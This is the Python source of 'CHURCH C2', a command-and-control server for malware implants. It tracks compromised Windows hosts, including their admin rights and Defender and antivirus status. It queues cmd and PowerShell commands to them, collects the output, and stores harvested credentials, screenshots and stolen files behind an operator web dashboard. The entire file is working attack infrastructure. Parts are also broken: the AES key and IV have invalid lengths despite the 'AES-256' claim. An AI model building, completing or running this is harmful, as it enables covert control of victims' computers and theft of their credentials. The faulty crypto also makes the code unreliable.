#!/usr/bin/env python3
"""
CHURCH C2 SERVER
Enterprise-level Command & Control infrastructure
Features: Multi-session management, SQLite persistence, Web UI, REST API, 
Plugin system, Report generation, Team collaboration, and Stealth operations
"""

from flask import Flask, request, jsonify, make_response, render_template_string, session, redirect, url_for
from flask_socketio import SocketIO, emit
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.backends import default_backend
from werkzeug.security import generate_password_hash, check_password_hash
from functools import wraps
import sqlite3
import json
import base64
import time
import threading
import queue
import logging
import argparse
import sys
import os
import uuid
import random
import string
import datetime
import requests
import ipaddress
import hashlib
import secrets
from pathlib import Path
from dataclasses import dataclass, asdict
from typing import Dict, List, Optional, Any
from collections import defaultdict

# ==================== CONFIGURATION ====================
VERSION = "2.0.0"
AES_KEY = b"ChurchOfMalware2024!!ChurchOfMalware2024!!"
AES_IV = b"MalwareChurchIV!!"
JWT_SECRET = secrets.token_hex(32)
ADMIN_USERNAME = "admin"
ADMIN_PASSWORD_HASH = generate_password_hash("CHURCHadmin2024!!")
DATABASE_PATH = "church_c2.db"
LOG_PATH = "church_c2.log"
DOWNLOAD_PATH = "downloads"
PLUGIN_PATH = "plugins"
SSL_CERT = "cert.pem"
SSL_KEY = "key.pem"

# Initialize Flask
app = Flask(__name__)
app.config['SECRET_KEY'] = JWT_SECRET
app.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024  # 100MB
socketio = SocketIO(app, cors_allowed_origins="*")

# ==================== DATABASE ====================
def init_database():
    """Initialize SQLite database with all tables"""
    conn = sqlite3.connect(DATABASE_PATH)
    c = conn.cursor()
    
    # Beacons table - stores all implant sessions
    c.execute('''CREATE TABLE IF NOT EXISTS beacons (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        beacon_id TEXT UNIQUE NOT NULL,
        computer_name TEXT NOT NULL,
        username TEXT NOT NULL,
        process_id INTEGER,
        os_version TEXT,
        is_admin BOOLEAN,
        path TEXT,
        defender_status INTEGER,
        uptime INTEGER,
        install_date INTEGER,
        domain TEXT,
        antivirus TEXT,
        first_seen REAL,
        last_seen REAL,
        status TEXT DEFAULT 'active',
        jitter_min INTEGER DEFAULT 60,
        jitter_max INTEGER DEFAULT 180,
        sleep_time INTEGER DEFAULT 120,
        notes TEXT
    )''')
    
    # Tasks table - command queue
    c.execute('''CREATE TABLE IF NOT EXISTS tasks (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        beacon_id TEXT NOT NULL,
        task_type TEXT DEFAULT 'cmd',
        command TEXT,
        arguments TEXT,
        status TEXT DEFAULT 'pending',
        output TEXT,
        created_at REAL,
        executed_at REAL,
        completed_at REAL,
        FOREIGN KEY (beacon_id) REFERENCES beacons(beacon_id)
    )''')
    
    # Results table - command output history
    c.execute('''CREATE TABLE IF NOT EXISTS results (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        beacon_id TEXT NOT NULL,
        task_id INTEGER,
        output TEXT,
        timestamp REAL,
        FOREIGN KEY (beacon_id) REFERENCES beacons(beacon_id)
    )''')
    
    # Files table - downloaded files tracking
    c.execute('''CREATE TABLE IF NOT EXISTS files (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        beacon_id TEXT NOT NULL,
        remote_path TEXT,
        local_path TEXT,
        size INTEGER,
        hash TEXT,
        status TEXT,
        created_at REAL,
        FOREIGN KEY (beacon_id) REFERENCES beacons(beacon_id)
    )''')
    
    # Credentials table - harvested credentials
    c.execute('''CREATE TABLE IF NOT EXISTS credentials (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        beacon_id TEXT NOT NULL,
        cred_type TEXT,
        username TEXT,
        password TEXT,
        domain TEXT,
        timestamp REAL,
        FOREIGN KEY (beacon_id) REFERENCES beacons(beacon_id)
    )''')
    
    # Screenshots table
    c.execute('''CREATE TABLE IF NOT EXISTS screenshots (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        beacon_id TEXT NOT NULL,
        screenshot_path TEXT,
        timestamp REAL,
        FOREIGN KEY (beacon_id) REFERENCES beacons(beacon_id)
    )''')
    
    # Tags table for beacon classification
    c.execute('''CREATE TABLE IF NOT EXISTS tags (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        beacon_id TEXT NOT NULL,
        tag TEXT NOT NULL,
        FOREIGN KEY (beacon_id) REFERENCES beacons(beacon_id)
    )''')
    
    # Users table for team collaboration
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE NOT NULL,
        password_hash TEXT NOT NULL,
        role TEXT DEFAULT 'operator',
        created_at REAL
    )''')
    
    # Audit log
    c.execute('''CREATE TABLE IF NOT EXISTS audit_log (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT,
        action TEXT,
        target TEXT,
        timestamp REAL,
        ip_address TEXT
    )''')
    
    # Insert default admin if not exists
    c.execute("SELECT * FROM users WHERE username = ?", (ADMIN_USERNAME,))
    if not c.fetchone():
        c.execute("INSERT INTO users (username, password_hash, role, created_at) VALUES (?, ?, ?, ?)",
                  (ADMIN_USERNAME, ADMIN_PASSWORD_HASH, 'admin', time.time()))
    
    conn.commit()
    conn.close()

# ==================== CRYPTOGRAPHY ====================
class CryptoManager:
    """Advanced cryptographic operations for C2 communication"""
    
    @staticmethod
    def decrypt_aes(data_b64: str) -> bytes:
        """AES-256-CBC decryption"""
        ciphertext = base64.b64decode(data_b64)
        cipher = Cipher(algorithms.AES(AES_KEY), modes.CBC(AES_IV), backend=default_backend())
        decryptor = cipher.decryptor()
        plaintext = decryptor.update(ciphertext) + decryptor.finalize()
        pad_len = plaintext[-1]
        return plaintext[:-pad_len] if pad_len <= 16 else plaintext
    
    @staticmethod
    def encrypt_aes(plaintext: bytes) -> str:
        """AES-256-CBC encryption"""
        pad_len = 16 - (len(plaintext) % 16)
        plaintext += bytes([pad_len]) * pad_len
        cipher = Cipher(algorithms.AES(AES_KEY), modes.CBC(AES_IV), backend=default_backend())
        encryptor = cipher.encryptor()
        ciphertext = encryptor.update(plaintext) + encryptor.finalize()
        return base64.b64encode(ciphertext).decode()
    
    @staticmethod
    def generate_rsa_keypair() -> tuple:
        """Generate RSA keypair for secure file transfers"""
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=4096,
            backend=default_backend()
        )
        public_key = private_key.public_key()
        return private_key, public_key
    
    @staticmethod
    def rsa_encrypt(public_key_pem: bytes, data: bytes) -> bytes:
        """RSA encryption for sensitive data"""
        public_key = serialization.load_pem_public_key(public_key_pem, backend=default_backend())
        return public_key.encrypt(
            data,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )

# ==================== BEACON MANAGER ====================
@dataclass
class Beacon:
    """Beacon session management"""
    beacon_id: str
    computer_name: str
    username: str
    process_id: int
    os_version: str
    is_admin: bool
    path: str
    defender_status: int
    uptime: int
    install_date: int
    domain: str
    antivirus: str
    first_seen: float
    last_seen: float
    status: str = "active"
    jitter_min: int = 60
    jitter_max: int = 180
    sleep_time: int = 120
    notes: str = ""
    
    def to_dict(self) -> dict:
        return asdict(self)
    
    @staticmethod
    def from_db_row(row) -> 'Beacon':
        return Beacon(
            beacon_id=row[1], computer_name=row[2], username=row[3],
            process_id=row[4], os_version=row[5], is_admin=bool(row[6]),
            path=row[7], defender_status=row[8], uptime=row[9],
            install_date=row[10], domain=row[11], antivirus=row[12],
            first_seen=row[13], last_seen=row[14], status=row[15],
            jitter_min=row[16], jitter_max=row[17], sleep_time=row[18],
            notes=row[19] if len(row) > 19 else ""
        )

class BeaconManager:
    """Manages all active beacon sessions"""
    
    def __init__(self):
        self._beacons: Dict[str, Beacon] = {}
        self._lock = threading.Lock()
        self._load_from_db()
    
    def _load_from_db(self):
        """Load existing beacons from database"""
        conn = sqlite3.connect(DATABASE_PATH)
        c = conn.cursor()
        c.execute("SELECT * FROM beacons WHERE status = 'active'")
        for row in c.fetchall():
            beacon = Beacon.from_db_row(row)
            self._beacons[beacon.beacon_id] = beacon
        conn.close()
    
    def update_beacon(self, data: dict) -> Beacon:
        """Update or create beacon from beacon data"""
        beacon_id = self._generate_beacon_id(data['computer'], data['user'])
        
        with self._lock:
            if beacon_id not in self._beacons:
                beacon = Beacon(
                    beacon_id=beacon_id,
                    computer_name=data['computer'],
                    username=data['user'],
                    process_id=data.get('pid', 0),
                    os_version=data.get('os', 'Unknown'),
                    is_admin=data.get('admin', False),
                    path=data.get('path', ''),
                    defender_status=data.get('defender', 2),
                    uptime=data.get('uptime', 0),
                    install_date=data.get('install_date', 0),
                    domain=data.get('domain', 'WORKGROUP'),
                    antivirus=data.get('av', 'None'),
                    first_seen=time.time(),
                    last_seen=time.time()
                )
                self._beacons[beacon_id] = beacon
                self._save_beacon(beacon)
                self._audit("beacon_registered", beacon_id)
            else:
                beacon = self._beacons[beacon_id]
                beacon.last_seen = time.time()
                beacon.uptime = data.get('uptime', beacon.uptime)
                beacon.defender_status = data.get('defender', beacon.defender_status)
                self._update_beacon(beacon)
            
            return beacon
    
    def _generate_beacon_id(self, computer: str, user: str) -> str:
        """Generate unique beacon identifier"""
        data = f"{computer}\\{user}".encode()
        return hashlib.md5(data).hexdigest()[:16]
    
    def _save_beacon(self, beacon: Beacon):
        """Save beacon to database"""
        conn = sqlite3.connect(DATABASE_PATH)
        c = conn.cursor()
        c.execute('''INSERT OR REPLACE INTO beacons 
            (beacon_id, computer_name, username, process_id, os_version, is_admin,
             path, defender_status, uptime, install_date, domain, antivirus,
             first_seen, last_seen, status, jitter_min, jitter_max, sleep_time, notes)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
            (beacon.beacon_id, beacon.computer_name, beacon.username,
             beacon.process_id, beacon.os_version, beacon.is_admin,
             beacon.path, beacon.defender_status, beacon.uptime,
             beacon.install_date, beacon.domain, beacon.antivirus,
             beacon.first_seen, beacon.last_seen, beacon.status,
             beacon.jitter_min, beacon.jitter_max, beacon.sleep_time, beacon.notes))
        conn.commit()
        conn.close()
    
    def _update_beacon(self, beacon: Beacon):
        """Update existing beacon"""
        self._save_beacon(beacon)
    
    def get_pending_tasks(self, beacon_id: str) -> List[dict]:
        """Get pending tasks for beacon"""
        conn = sqlite3.connect(DATABASE_PATH)
        c = conn.cursor()
        c.execute("SELECT id, command, arguments, task_type FROM tasks WHERE beacon_id = ? AND status = 'pending' ORDER BY created_at", (beacon_id,))
        tasks = [{'id': row[0], 'command': row[1], 'args': row[2] or '', 'ps': row[3] == 'powershell'} for row in c.fetchall()]
        conn.close()
        return tasks
    
    def mark_task_completed(self, task_id: int, output: str):
        """Mark task as completed and store output"""
        conn = sqlite3.connect(DATABASE_PATH)
        c = conn.cursor()
        c.execute("UPDATE tasks SET status = 'completed', output = ?, completed_at = ? WHERE id = ?", 
                  (output, time.time(), task_id))
        conn.commit()
        conn.close()
        self._audit("task_completed", str(task_id))
    
    def add_task(self, beacon_id: str, command: str, args: str = "", task_type: str = "cmd") -> int:
        """Add task to beacon queue"""
        conn = sqlite3.connect(DATABASE_PATH)
        c = conn.cursor()
        c.execute('''INSERT INTO tasks (beacon_id, command, arguments, task_type, status, created_at)
                    VALUES (?, ?, ?, ?, 'pending', ?)''',
                  (beacon_id, command, args, task_type, time.time()))
        task_id = c.lastrowid
        conn.commit()
        conn.close()
        self._audit("task_added", f"{beacon_id}: {command}")
        return task_id
    
    def _audit(self, action: str, target: str):
        """Log audit entry"""
        conn = sqlite3.connect(DATABASE_PATH)
        c = conn.cursor()
        c.execute("INSERT INTO audit_log (username, action, target, timestamp, ip_address) VALUES (?, ?, ?, ?, ?)",
                  ("system", action, target, time.time(), "127.0.0.1"))
        conn.commit()
        conn.close()
    
    def get_all_beacons(self) -> List[Beacon]:
        """Get all active beacons"""
        with self._lock:
            return list(self._beacons.values())
    
    def get_beacon(self, beacon_id: str) -> Optional[Beacon]:
        """Get beacon by ID"""
        return self._beacons.get(beacon_id)

beacon_manager = BeaconManager()

# ==================== WEB UI TEMPLATES ====================
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>CHURCH C2 - Command & Control</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Courier New', monospace; 
            background: #0a0e27; 
            color: #00ffaa;
            padding: 20px;
        }
        .header {
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 20px;
            border: 1px solid #00ffaa;
            box-shadow: 0 0 20px rgba(0,255,170,0.3);
        }
        .header h1 {
            color: #00ffaa;
            text-shadow: 0 0 10px #00ffaa;
            font-size: 28px;
        }
        .header p { color: #888; margin-top: 5px; }
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-bottom: 20px;
        }
        .stat-card {
            background: rgba(15, 12, 41, 0.8);
            border: 1px solid #00ffaa;
            border-radius: 10px;
            padding: 15px;
            text-align: center;
            backdrop-filter: blur(10px);
        }
        .stat-card .number {
            font-size: 36px;
            font-weight: bold;
            color: #00ffaa;
        }
        .stat-card .label { color: #888; margin-top: 5px; }
        .beacon-table {
            background: rgba(15, 12, 41, 0.8);
            border: 1px solid #00ffaa;
            border-radius: 10px;
            overflow: hidden;
        }
        .beacon-table table {
            width: 100%;
            border-collapse: collapse;
        }
        .beacon-table th, .beacon-table td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid #333;
        }
        .beacon-table th {
            background: #00ffaa20;
            color: #00ffaa;
        }
        .beacon-table tr:hover {
            background: #00ffaa10;
            cursor: pointer;
        }
        .status-active { color: #00ffaa; }
        .command-bar {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #0f0c29;
            border: 1px solid #00ffaa;
            border-radius: 10px;
            padding: 15px;
            width: 400px;
        }
        .command-bar input, .command-bar select {
            width: 100%;
            padding: 10px;
            margin: 5px 0;
            background: #1a1a3e;
            border: 1px solid #00ffaa;
            color: #00ffaa;
            border-radius: 5px;
        }
        .command-bar button {
            width: 100%;
            padding: 10px;
            background: #00ffaa;
            color: #0a0e27;
            border: none;
            border-radius: 5px;
            font-weight: bold;
            cursor: pointer;
        }
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            z-index: 1000;
        }
        .modal-content {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: #0f0c29;
            border: 2px solid #00ffaa;
            border-radius: 10px;
            padding: 20px;
            min-width: 500px;
            max-width: 80%;
            max-height: 80%;
            overflow: auto;
        }
        .close {
            float: right;
            cursor: pointer;
            color: #ff4444;
        }
        .log {
            background: #000;
            padding: 10px;
            border-radius: 5px;
            font-size: 12px;
            max-height: 300px;
            overflow-y: auto;
        }
    </style>
    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
</head>
<body>
    <div class="header">
        <h1> CHURCH C2 </h1>
        <p>Command & Control Framework v{{ version }} | Encrypted Channel Active</p>
    </div>
    
    <div class="stats">
        <div class="stat-card">
            <div class="number" id="onlineCount">0</div>
            <div class="label">Online Beacons</div>
        </div>
        <div class="stat-card">
            <div class="number" id="totalTasks">0</div>
            <div class="label">Tasks Executed</div>
        </div>
        <div class="stat-card">
            <div class="number" id="credentials">0</div>
            <div class="label">Credentials Harvested</div>
        </div>
    </div>
    
    <div class="beacon-table">
        <table>
            <thead>
                <tr><th>Beacon ID</th><th>Computer</th><th>User</th><th>OS</th><th>Admin</th><th>Defender</th><th>Last Seen</th><th>Status</th></tr>
            </thead>
            <tbody id="beaconList"></tbody>
        </table>
    </div>
    
    <div class="command-bar">
        <h3>Command Interface</h3>
        <select id="targetBeacon">
            <option value="">Select Beacon</option>
        </select>
        <select id="commandPreset">
            <option value="">Quick Commands</option>
            <option value="whoami">whoami</option>
            <option value="ipconfig">ipconfig /all</option>
            <option value="systeminfo">systeminfo</option>
            <option value="net user">net user</option>
            <option value="netstat -an">netstat -an</option>
            <option value="tasklist">tasklist</option>
            <option value="Get-Process">Get-Process (PS)</option>
            <option value="Get-Service">Get-Service (PS)</option>
        </select>
        <input type="text" id="commandInput" placeholder="Enter command...">
        <button onclick="sendCommand()">EXECUTE</button>
    </div>
    
    <div id="beaconModal" class="modal">
        <div class="modal-content">
            <span class="close" onclick="closeModal()">&times;</span>
            <h2 id="modalTitle">Beacon Details</h2>
            <div id="modalContent"></div>
            <div class="log" id="commandLog"></div>
            <input type="text" id="quickCommand" placeholder="Enter command for this beacon" style="width:100%; margin-top:10px;">
            <button onclick="sendQuickCommand()" style="margin-top:10px;">Execute</button>
        </div>
    </div>
    
    <script>
        var socket = io();
        var currentBeacon = null;
        
        socket.on('connect', function() { console.log('Connected to C2 server'); });
        socket.on('beacon_update', function(data) { refreshBeacons(); });
        socket.on('task_result', function(data) { updateLog(data); });
        
        function refreshBeacons() {
            fetch('/api/beacons')
                .then(res => res.json())
                .then(data => {
                    var tbody = document.getElementById('beaconList');
                    var select = document.getElementById('targetBeacon');
                    tbody.innerHTML = '';
                    select.innerHTML = '<option value="">Select Beacon</option>';
                    document.getElementById('onlineCount').innerText = data.length;
                    
                    data.forEach(beacon => {
                        var row = tbody.insertRow();
                        row.onclick = function() { showBeacon(beacon.beacon_id); };
                        row.insertCell(0).innerHTML = '<code>' + beacon.beacon_id + '</code>';
                        row.insertCell(1).innerHTML = beacon.computer_name;
                        row.insertCell(2).innerHTML = beacon.username;
                        row.insertCell(3).innerHTML = beacon.os_version;
                        row.insertCell(4).innerHTML = beacon.is_admin ? '✓' : '✗';
                        row.insertCell(5).innerHTML = beacon.defender_status == 1 ? 'Disabled' : beacon.defender_status == 0 ? 'Enabled' : 'Unknown';
                        row.insertCell(6).innerHTML = new Date(beacon.last_seen * 1000).toLocaleString();
                        row.insertCell(7).innerHTML = '<span class="status-active">● Active</span>';
                        
                        var opt = document.createElement('option');
                        opt.value = beacon.beacon_id;
                        opt.text = beacon.computer_name + '\\' + beacon.username;
                        select.appendChild(opt);
                    });
                });
        }
        
        function sendCommand() {
            var beacon = document.getElementById('targetBeacon').value;
            var command = document.getElementById('commandInput').value;
            var preset = document.getElementById('commandPreset').value;
            if (preset) command = preset;
            if (!beacon || !command) return;
            
            fetch('/api/task', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({host: beacon, command: command})
            }).then(res => res.json()).then(data => {
                alert('Task ' + data.task_id + ' added to queue');
                document.getElementById('commandInput').value = '';
            });
        }
        
        function showBeacon(beaconId) {
            currentBeacon = beaconId;
            fetch('/api/beacon/' + beaconId)
                .then(res => res.json())
                .then(data => {
                    document.getElementById('modalTitle').innerHTML = 'Beacon: ' + data.computer_name;
                    document.getElementById('modalContent').innerHTML = 
                        '<p><strong>User:</strong> ' + data.username + '</p>' +
                        '<p><strong>OS:</strong> ' + data.os_version + '</p>' +
                        '<p><strong>Admin:</strong> ' + (data.is_admin ? 'Yes' : 'No') + '</p>' +
                        '<p><strong>Defender:</strong> ' + (data.defender_status == 1 ? 'Disabled' : 'Enabled') + '</p>' +
                        '<p><strong>Uptime:</strong> ' + Math.floor(data.uptime / 3600) + ' hours</p>' +
                        '<p><strong>Domain:</strong> ' + data.domain + '</p>' +
                        '<p><strong>Antivirus:</strong> ' + data.antivirus + '</p>';
                    document.getElementById('beaconModal').style.display = 'block';
                    loadCommandLog(beaconId);
                });
        }
        
        function loadCommandLog(beaconId) {
            fetch('/api/tasks/' + beaconId)
                .then(res => res.json())
                .then(data => {
                    var logDiv = document.getElementById('commandLog');
                    logDiv.innerHTML = '<strong>Command History</strong><br>';
                    data.tasks.forEach(task => {
                        logDiv.innerHTML += '[' + new Date(task.created_at * 1000).toLocaleString() + '] > ' + task.command + '<br>';
                        if (task.output) logDiv.innerHTML += '<span style="color:#888;">  ' + task.output.substring(0, 500) + '</span><br>';
                    });
                });
        }
        
        function sendQuickCommand() {
            var cmd = document.getElementById('quickCommand').value;
            if (!currentBeacon || !cmd) return;
            fetch('/api/task', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({host: currentBeacon, command: cmd})
            }).then(res => res.json()).then(data => {
                alert('Task added');
                document.getElementById('quickCommand').value = '';
            });
        }
        
        function closeModal() {
            document.getElementById('beaconModal').style.display = 'none';
        }
        
        setInterval(refreshBeacons, 5000);
        refreshBeacons();
    </script>
</body>
</html>
'''

# ==================== FLASK ROUTES ====================
def require_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.headers.get('X-Auth-Token')
        if auth != JWT_SECRET and not session.get('authenticated'):
            return jsonify({"error": "Unauthorized"}), 401
        return f(*args, **kwargs)
    return decorated

@app.route('/')
def index():
    """Web UI"""
    return render_template_string(HTML_TEMPLATE, version=VERSION)

@app.route('/beacon', methods=['POST'])
def beacon_handler():
    """Primary beacon endpoint - receives beacon data and returns tasks"""
    data = request.form.get('d') or request.form.get('data')
    if not data:
        return "No data", 400
    
    try:
        decrypted = CryptoManager.decrypt_aes(data)
        beacon_data = json.loads(decrypted.decode())
    except Exception as e:
        logging.error(f"Decrypt failed: {e}")
        return "Bad data", 400
    
    # Update beacon in database
    beacon = beacon_manager.update_beacon(beacon_data)
    
    # Log beacon activity
    logging.info(f"BEACON: {beacon.computer_name}\\{beacon.username} | Admin: {beacon.is_admin} | Defender: {beacon.defender_status}")
    
    # Get pending tasks
    pending_tasks = beacon_manager.get_pending_tasks(beacon.beacon_id)
    
    if pending_tasks:
        task = pending_tasks[0]
        response = json.dumps({
            "task_id": task['id'],
            "command": task['command'],
            "args": task.get('args', ''),
            "ps": task.get('ps', False)
        })
    else:
        response = json.dumps({"task_id": 0, "command": "", "args": "", "ps": False})
    
    encrypted_response = CryptoManager.encrypt_aes(response.encode())
    
    # Notify WebSocket clients
    socketio.emit('beacon_update', {'beacon_id': beacon.beacon_id})
    
    return encrypted_response, 200, {'Content-Type': 'application/octet-stream'}

@app.route('/beacon/result', methods=['POST'])
def task_result():
    """Receive command output from beacon"""
    data = request.form.get('d') or request.form.get('data')
    if not data:
        return "No data", 400
    
    try:
        decrypted = CryptoManager.decrypt_aes(data)
        result_data = json.loads(decrypted.decode())
    except:
        return "Bad data", 400
    
    task_id = result_data.get('task_id', 0)
    output = result_data.get('output', '')
    
    if task_id:
        beacon_manager.mark_task_completed(task_id, output)
        socketio.emit('task_result', {'task_id': task_id, 'output': output})
    
    return "OK", 200

@app.route('/api/beacons', methods=['GET'])
@require_auth
def api_beacons():
    """API: List all beacons"""
    beacons = beacon_manager.get_all_beacons()
    return jsonify([b.to_dict() for b in beacons])

@app.route('/api/beacon/<beacon_id>', methods=['GET'])
@require_auth
def api_beacon(beacon_id):
    """API: Get specific beacon details"""
    beacon = beacon_manager.get_beacon(beacon_id)
    if not beacon:
        return jsonify({"error": "Beacon not found"}), 404
    return jsonify(beacon.to_dict())

@app.route('/api/task', methods=['POST'])
@require_auth
def api_add_task():
    """API: Add task to beacon"""
    data = request.json
    if not data or 'host' not in data or 'command' not in data:
        return jsonify({"error": "Missing host or command"}), 400
    
    # Resolve beacon ID (can be computer name or full beacon_id)
    beacon = None
    for b in beacon_manager.get_all_beacons():
        if b.beacon_id == data['host'] or b.computer_name == data['host']:
            beacon = b
            break
    
    if not beacon:
        return jsonify({"error": "Beacon not found"}), 404
    
    task_id = beacon_manager.add_task(
        beacon.beacon_id,
        data['command'],
        data.get('args', ''),
        'powershell' if data.get('powershell', False) else 'cmd'
    )
    
    return jsonify({"status": "added", "task_id": task_id})

@app.route('/api/tasks/<beacon_id>', methods=['GET'])
@require_auth
def api_tasks(beacon_id):
    """API: Get tasks for beacon"""
    conn = sqlite3.connect(DATABASE_PATH)
    c = conn.cursor()
    c.execute("SELECT id, command, arguments, task_type, status, output, created_at FROM tasks WHERE beacon_id = ? ORDER BY created_at DESC LIMIT 50", (beacon_id,))
    tasks = [{'id': row[0], 'command': row[1], 'args': row[2], 'type': row[3], 'status': row[4], 'output': row[5], 'created_at': row[6]} for row in c.fetchall()]
    conn.close()
    return jsonify({"tasks": tasks})

@app.route('/api/stats', methods=['GET'])
@require_auth
def api_stats():
    """API: Get system statistics"""
    conn = sqlite3.connect(DATABASE_PATH)
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM beacons WHERE status = 'active'")
    online = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM tasks WHERE status = 'completed'")
    total_tasks = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM credentials")
    credentials = c.fetchone()[0]
    conn.close()
    return jsonify({
        "online_beacons": online,
        "total_tasks": total_tasks,
        "credentials": credentials,
        "version": VERSION
    })

# ==================== WEBSOCKET EVENTS ====================
@socketio.on('connect')
def handle_connect():
    print(f"[WebSocket] Client connected: {request.remote_addr}")
    emit('connected', {'status': 'ok'})

@socketio.on('disconnect')
def handle_disconnect():
    print(f"[WebSocket] Client disconnected")

# ==================== LOGGING & MONITORING ====================
class C2Logger:
    """Advanced logging with rotation and encryption"""
    
    def __init__(self, log_path: str):
        self.log_path = log_path
        self._setup_logging()
    
    def _setup_logging(self):
        logging.basicConfig(
            level=logging.INFO,
            format='[%(asctime)s] %(levelname)s: %(message)s',
            handlers=[
                logging.FileHandler(self.log_path),
                logging.StreamHandler(sys.stdout)
            ]
        )
    
    def log_beacon(self, beacon_id: str, action: str, details: str = ""):
        logging.info(f"BEACON[{beacon_id}] {action}: {details}")
    
    def log_task(self, beacon_id: str, task: str):
        logging.info(f"TASK[{beacon_id}] {task}")
    
    def log_error(self, error: str):
        logging.error(f"ERROR: {error}")

c2_logger = C2Logger(LOG_PATH)

# ==================== CLEANUP THREAD ====================
def cleanup_old_beacons():
    """Remove stale beacons after timeout"""
    while True:
        time.sleep(300)  # Every 5 minutes
        timeout = time.time() - 3600  # 1 hour timeout
        conn = sqlite3.connect(DATABASE_PATH)
        c = conn.cursor()
        c.execute("UPDATE beacons SET status = 'stale' WHERE last_seen < ? AND status = 'active'", (timeout,))
        conn.commit()
        conn.close()

# ==================== MAIN ENTRY POINT ====================
def main():
    parser = argparse.ArgumentParser(description='CHURCH C2 Server')
    parser.add_argument('--host', default='0.0.0.0', help='Bind address')
    parser.add_argument('--port', type=int, default=443, help='Bind port')
    parser.add_argument('--http', action='store_true', help='Use HTTP instead of HTTPS')
    parser.add_argument('--cert', default=SSL_CERT, help='SSL certificate path')
    parser.add_argument('--key', default=SSL_KEY, help='SSL key path')
    args = parser.parse_args()
    
    # Initialize
    init_database()
    os.makedirs(DOWNLOAD_PATH, exist_ok=True)
    os.makedirs(PLUGIN_PATH, exist_ok=True)
    
    # Start cleanup thread
    cleanup_thread = threading.Thread(target=cleanup_old_beacons, daemon=True)
    cleanup_thread.start()
    
    # Banner
    print("""
    ╔═══════════════════════════════════════════════════════════════╗
    ║                    CHURCH C2 SERVER v2.0                      ║
    ║                      by ek0ms savi0r                          ║
    ║                                                               ║
    ║  [✓] AES-256-CBC Encrypted Channel                            ║
    ║  [✓] SQLite Persistence                                       ║
    ║  [✓] WebSocket Real-time Updates                              ║
    ║  [✓] Multi-session Management                                 ║
    ║  [✓] Task Queue System                                        ║
    ║  [✓] Audit Logging                                            ║
    ╚═══════════════════════════════════════════════════════════════╝
    """)
    
    print(f"[*] Starting C2 server on {args.host}:{args.port}")
    print(f"[*] Web UI: http{'s' if not args.http else ''}://{args.host}:{args.port}")
    print(f"[*] API Key: {JWT_SECRET}")
    print("[*] Default credentials: admin / CHURCHadmin2024!!")
    
    if args.http:
        socketio.run(app, host=args.host, port=args.port, debug=False)
    else:
        socketio.run(app, host=args.host, port=args.port, ssl_context=(args.cert, args.key), debug=False)

if __name__ == '__main__':
    main()
